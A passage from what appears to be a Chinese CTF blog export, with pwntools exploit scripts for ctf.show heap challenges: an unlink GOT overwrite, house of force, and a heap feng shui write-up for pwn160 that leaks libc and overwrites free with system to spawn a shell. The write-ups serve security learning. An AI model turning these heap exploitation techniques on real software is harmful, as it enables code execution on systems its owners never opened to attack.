class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;of name:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name:&quot;</span>)</span><br><span class=\"line\">    io.send(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">   </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">flag=<span class=\"number\">0x400D7F</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x90</span>,<span class=\"string\">b&#x27;bbbb&#x27;</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;cccc&#x27;</span>) <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>) <span class=\"comment\">#3</span></span><br><span class=\"line\">ptr=<span class=\"number\">0x6020a8</span></span><br><span class=\"line\">fd=ptr-<span class=\"number\">0x18</span></span><br><span class=\"line\">bk=ptr-<span class=\"number\">0x10</span></span><br><span class=\"line\">fake_chunk=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x61</span>)</span><br><span class=\"line\">fake_chunk+=p64(fd)+p64(bk)</span><br><span class=\"line\">fake_chunk+=p64(<span class=\"number\">0</span>)*<span class=\"number\">8</span></span><br><span class=\"line\">fake_chunk+=p64(<span class=\"number\">0x60</span>)+p64(<span class=\"number\">0xa0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(fake_chunk),fake_chunk)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x90</span>)+p64(elf.got[<span class=\"string\">&#x27;free&#x27;</span>])</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recv(<span class=\"number\">4</span>)</span><br><span class=\"line\">free=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;free-&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(free)))</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;free&quot;</span>,free)</span><br><span class=\"line\">libcbase=free-libc.dump(<span class=\"string\">&quot;free&quot;</span>)</span><br><span class=\"line\">system=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x8</span>,p64(system))</span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"house-of-force\"><a href=\"#house-of-force\" class=\"headerlink\" title=\"house of force\"></a>house of force</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">0</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28197</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,name</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;length:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name:&quot;</span>)</span><br><span class=\"line\">    io.send(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,name</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;of name:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name:&quot;</span>)</span><br><span class=\"line\">    io.send(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">   </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_flag</span>():</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;5&quot;</span>)</span><br><span class=\"line\">flag=<span class=\"number\">0x400D7F</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">7</span>+p64(<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x41</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">offset=-<span class=\"number\">0x70</span></span><br><span class=\"line\">add(offset,<span class=\"string\">b&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,p64(flag)*<span class=\"number\">2</span>)</span><br><span class=\"line\">get_flag()</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"CTFshow pwn160","cover":"/img/治不开心药.png","_content":"# CTFshow pwn160(堆风水)\n\n## ida分析 \n\n### main函数分析\n![1741933551272.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cbefdff92.png)\n1.简单的菜单题，通过menu，简单把函数名称修改，做一个简单的逆向\n\n### add函数分析            \n![1741933652418.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cc54920c5.png)\n1.通过add函数，要对堆块的储存结构有清晰的认知，这会影响甚至是决定我们攻击的手法。\n2.可以看到每次add会申清两个堆块，一个大小由我们控制，一个大小固定为0x80。并且，大小自由的堆块的指针会被保存在，大小固定的那个堆块内。而大小固定的那个堆块的指针会被保存在heaplist(逆向重命名过)上。\n3.input第一个参数是作为指针，所以他会写在v3上，位置是s指针后面。\n4.然后这里调用edit去编辑堆块内容\n\n### edit函数分析\n![1741934774792.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d0bb5c4d7.png)\n1.看到这里对输入字节大小的检查，就可以联想到堆风水。是通过堆块的位置加上输入字节的大小，与另一块堆块的地址大小比较来判断。如果这两个堆块之间，有其他堆块，那么我们就可以对中间的堆块为所欲为了。\n\n### show函数分析\n![1741935092305.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d1f5186f5.png)\n1.唯一的作用就是泄露libc\n\n### delete函数分析\n![1741935146434.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d22ae54bb.png)\n1.没有uaf，不能直接利用\n\n### gdb分析\n![1741934513485.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cfb254f83.png)\n1.通过gdb，可以对堆块的内容，结构有更清晰的观察和了解\n\n## 构造思路\n1.首先确定攻击的手法——堆风水.也就是要造成我们申清的堆块在最上方，add自动申清的堆块在最下方。此时我们就可以控制中间的堆块了.而0x80大小，会被放入unsortedbin中，满足先进先出的规则。那么我们先申请几个堆块，小于0x80。free掉堆块0，再add一个0x80大小的堆块，它会在从unsortedbin中取出之前的堆块给我们，同时从topchunk中分配出另一块。至此，一块低地址，一块高地址的堆块构造完成。\n2.第二部对照gdb，把对应位置出的内容修改成free_got就可以通过show泄露libc.然后再通过edit修改got表内容。\n3.最后delete一块内容为`/bin/sh\\x00`的堆块就可以打通了.\n\n## exp\n### 比较复杂的解法\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='i386',log_level='debug')\nmode=1\nurl='pwn.challenge.ctf.show'\nport=28252\nelf=ELF(\"./pwn\")\nif mode == 0:\n    io=process(\"./pwn\")\nelse :\n    io=remote(url,port)\n\ndef add(size,name,lenth,content):\n    io.recvuntil(\"Action: \")\n    io.sendline(\"0\")\n    io.recvuntil(\"size of description: \")\n    io.sendline(str(size))\n    io.recvuntil(\"name: \")\n    io.sendline(name)\n    io.recvuntil(\"text length: \")\n    io.sendline(str(lenth))\n    io.recvuntil(\"text: \")\n    io.sendline(content)\n\ndef delete(idx):\n    io.recvuntil(\"Action: \")\n    io.sendline(\"1\")\n    io.recvuntil(\"\")\n    io.sendline(str(idx))\n\ndef show(idx):\n    io.recvuntil(\"Action: \")\n    io.sendline(\"2\")\n    io.recvuntil(\"\")\n    io.sendline(str(idx))\n\ndef edit(idx,lenth,content):\n    io.recvuntil(\"Action: \")\n    io.sendline(\"3\")\n    io.recvuntil(\"index: \")\n    io.sendline(str(idx))\n    io.recvuntil(\"text length: \")\n    io.sendline(str(lenth))\n    io.recvuntil(\"text: \")\n    io.sendline(content)\n\nadd(0x10,b\"a\",0x8,b'hhhh')  #0\nadd(0x20,b\"b\",0x8,b'hhhh')  #1\nadd(0x20,b\"c\",0x8,b'hhhh')  #2\nadd(0x20,b\"d\",0x10,b'/bin/sh\\x00')  #3\ndelete(2)  \ndelete(0)\n\nadd(0x10,b\"d\",0x40,b'aaaa') #4\nadd(0x80,b'e',0x8,b'bbbb')  #5\nfree_got=elf.got['free']\npayload=p32(0)*5+p32(0x89)\npayload+=p32(0)*16\npayload+=p32(0x88)+p32(0x28)\npayload+=p32(0)*9+p32(0x89)\npayload+=p32(0)*4\npayload+=p32(0x88)+p64(0x29)\npayload+=p32(0)*8+p32(0x89)\npayload+=p32(free_got)\nedit(4,len(payload),payload)\nshow(1)\nio.recvuntil(\"description: \")\nfree=u32(io.recv(4))\nlog.success('free-{}'.format(hex(free)))\n#gdb.attach(io)\nlibc=LibcSearcher(\"free\",free)\nlibcbase=free-libc.dump('free')\nsystem=libcbase+libc.dump('system')\nedit(1,0x4,p32(system))\n#gdb.attach(io)\ndelete(3)\nio.interactive()\n```\n现在看来，delete(2)似乎有点多余了","source":"_posts/heap/CTFshow pwn160.md","raw":"---\ntitle: CTFshow pwn160\ntags:\n    - pwn\n    - 堆风水\ncategories:\n    - 做题笔记\ncover: /img/治不开心药.png\n---\n# CTFshow pwn160(堆风水)\n\n## ida分析 \n\n### main函数分析\n![1741933551272.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cbefdff92.png)\n1.简单的菜单题，通过menu，简单把函数名称修改，做一个简单的逆向\n\n### add函数分析            \n![1741933652418.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cc54920c5.png)\n1.通过add函数，要对堆块的储存结构有清晰的认知，这会影响甚至是决定我们攻击的手法。\n2.可以看到每次add会申清两个堆块，一个大小由我们控制，一个大小固定为0x80。并且，大小自由的堆块的指针会被保存在，大小固定的那个堆块内。而大小固定的那个堆块的指针会被保存在heaplist(逆向重命名过)上。\n3.input第一个参数是作为指针，所以他会写在v3上，位置是s指针后面。\n4.然后这里调用edit去编辑堆块内容\n\n### edit函数分析\n![1741934774792.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d0bb5c4d7.png)\n1.看到这里对输入字节大小的检查，就可以联想到堆风水。是通过堆块的位置加上输入字节的大小，与另一块堆块的地址大小比较来判断。如果这两个堆块之间，有其他堆块，那么我们就可以对中间的堆块为所欲为了。\n\n### show函数分析\n![1741935092305.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d1f5186f5.png)\n1.唯一的作用就是泄露libc\n\n### delete函数分析\n![1741935146434.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d22ae54bb.png)\n1.没有uaf，不能直接利用\n\n### gdb分析\n![1741934513485.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cfb254f83.png)\n1.通过gdb，可以对堆块的内容，结构有更清晰的观察和了解\n\n## 构造思路\n1.首先确定攻击的手法——堆风水.也就是要造成我们申清的堆块在最上方，add自动申清的堆块在最下方。此时我们就可以控制中间的堆块了.而0x80大小，会被放入unsortedbin中，满足先进先出的规则。那么我们先申请几个堆块，小于0x80。free掉堆块0，再add一个0x80大小的堆块，它会在从unsortedbin中取出之前的堆块给我们，同时从topchunk中分配出另一块。至此，一块低地址，一块高地址的堆块构造完成。\n2.第二部对照gdb，把对应位置出的内容修改成free_got就可以通过show泄露libc.然后再通过edit修改got表内容。\n3.最后delete一块内容为`/bin/sh\\x00`的堆块就可以打通了.\n\n## exp\n### 比较复杂的解法\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='i386',log_level='debug')\nmode=1\nurl='pwn.challenge.ctf.show'\nport=28252\nelf=ELF(\"./pwn\")\nif mode == 0:\n    io=process(\"./pwn\")\nelse :\n    io=remote(url,port)\n\ndef add(size,name,lenth,content):\n    io.recvuntil(\"Action: \")\n    io.sendline(\"0\")\n    io.recvuntil(\"size of description: \")\n    io.sendline(str(size))\n    io.recvuntil(\"name: \")\n    io.sendline(name)\n    io.recvuntil(\"text length: \")\n    io.sendline(str(lenth))\n    io.recvuntil(\"text: \")\n    io.sendline(content)\n\ndef delete(idx):\n    io.recvuntil(\"Action: \")\n    io.sendline(\"1\")\n    io.recvuntil(\"\")\n    io.sendline(str(idx))\n\ndef show(idx):\n    io.recvuntil(\"Action: \")\n    io.sendline(\"2\")\n    io.recvuntil(\"\")\n    io.sendline(str(idx))\n\ndef edit(idx,lenth,content):\n    io.recvuntil(\"Action: \")\n    io.sendline(\"3\")\n    io.recvuntil(\"index: \")\n    io.sendline(str(idx))\n    io.recvuntil(\"text length: \")\n    io.sendline(str(lenth))\n    io.recvuntil(\"text: \")\n    io.sendline(content)\n\nadd(0x10,b\"a\",0x8,b'hhhh')  #0\nadd(0x20,b\"b\",0x8,b'hhhh')  #1\nadd(0x20,b\"c\",0x8,b'hhhh')  #2\nadd(0x20,b\"d\",0x10,b'/bin/sh\\x00')  #3\ndelete(2)  \ndelete(0)\n\nadd(0x10,b\"d\",0x40,b'aaaa') #4\nadd(0x80,b'e',0x8,b'bbbb')  #5\nfree_got=elf.got['free']\npayload=p32(0)*5+p32(0x89)\npayload+=p32(0)*16\npayload+=p32(0x88)+p32(0x28)\npayload+=p32(0)*9+p32(0x89)\npayload+=p32(0)*4\npayload+=p32(0x88)+p64(0x29)\npayload+=p32(0)*8+p32(0x89)\npayload+=p32(free_got)\nedit(4,len(payload),payload)\nshow(1)\nio.recvuntil(\"description: \")\nfree=u32(io.recv(4))\nlog.success('free-{}'.format(hex(free)))\n#gdb.attach(io)\nlibc=LibcSearcher(\"free\",free)\nlibcbase=free-libc.dump('free')\nsystem=libcbase+libc.dump('system')\nedit(1,0x4,p32(system))\n#gdb.attach(io)\ndelete(3)\nio.interactive()\n```\n现在看来，delete(2)似乎有点多余了","slug":"heap/CTFshow pwn160","published":1,"date":"2025-06-22T12:08:58.256Z","updated":"2025-06-23T05:47:36.429Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2ia0016uomy55856ad6","content":"<h1 id=\"CTFshow-pwn160-堆风水\"><a href=\"#CTFshow-pwn160-堆风水\" class=\"headerlink\" title=\"CTFshow pwn160(堆风水)\"></a>CTFshow pwn160(堆风水)</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数分析\"><a href=\"#main函数分析\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cbefdff92.png\" alt=\"1741933551272.png\"><br>1.简单的菜单题，通过menu，简单把函数名称修改，做一个简单的逆向</p>\n<h3 id=\"add函数分析\"><a href=\"#add函数分析\" class=\"headerlink\" title=\"add函数分析\"></a>add函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cc54920c5.png\" alt=\"1741933652418.png\"><br>1.通过add函数，要对堆块的储存结构有清晰的认知，这会影响甚至是决定我们攻击的手法。<br>2.可以看到每次add会申清两个堆块，一个大小由我们控制，一个大小固定为0x80。并且，大小自由的堆块的指针会被保存在，大小固定的那个堆块内。而大小固定的那个堆块的指针会被保存在heaplist(逆向重命名过)上。<br>3.input第一个参数是作为指针，所以他会写在v3上，位置是s指针后面。<br>4.然后这里调用edit去编辑堆块内容</p>\n<h3 id=\"edit函数分析\"><a href=\"#edit函数分析\" class=\"headerlink\" title=\"edit函数分析\"></a>edit函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d0bb5c4d7.png\" alt=\"1741934774792.png\"><br>1.看到这里对输入字节大小的检查，就可以联想到堆风水。是通过堆块的位置加上输入字节的大小，与另一块堆块的地址大小比较来判断。如果这两个堆块之间，有其他堆块，那么我们就可以对中间的堆块为所欲为了。</p>\n<h3 id=\"show函数分析\"><a href=\"#show函数分析\" class=\"headerlink\" title=\"show函数分析\"></a>show函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d1f5186f5.png\" alt=\"1741935092305.png\"><br>1.唯一的作用就是泄露libc</p>\n<h3 id=\"delete函数分析\"><a href=\"#delete函数分析\" class=\"headerlink\" title=\"delete函数分析\"></a>delete函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d22ae54bb.png\" alt=\"1741935146434.png\"><br>1.没有uaf，不能直接利用</p>\n<h3 id=\"gdb分析\"><a href=\"#gdb分析\" class=\"headerlink\" title=\"gdb分析\"></a>gdb分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cfb254f83.png\" alt=\"1741934513485.png\"><br>1.通过gdb，可以对堆块的内容，结构有更清晰的观察和了解</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先确定攻击的手法——堆风水.也就是要造成我们申清的堆块在最上方，add自动申清的堆块在最下方。此时我们就可以控制中间的堆块了.而0x80大小，会被放入unsortedbin中，满足先进先出的规则。那么我们先申请几个堆块，小于0x80。free掉堆块0，再add一个0x80大小的堆块，它会在从unsortedbin中取出之前的堆块给我们，同时从topchunk中分配出另一块。至此，一块低地址，一块高地址的堆块构造完成。<br>2.第二部对照gdb，把对应位置出的内容修改成free_got就可以通过show泄露libc.然后再通过edit修改got表内容。<br>3.最后delete一块内容为<code>/bin/sh\\x00</code>的堆块就可以打通了.</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"比较复杂的解法\"><a href=\"#比较复杂的解法\" class=\"headerlink\" title=\"比较复杂的解法\"></a>比较复杂的解法</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;i386&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28252</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,name,lenth,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;size of description: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name: &quot;</span>)</span><br><span class=\"line\">    io.sendline(name)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;text length: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(lenth))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;text: &quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,lenth,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;text length: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(lenth))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;text: &quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span 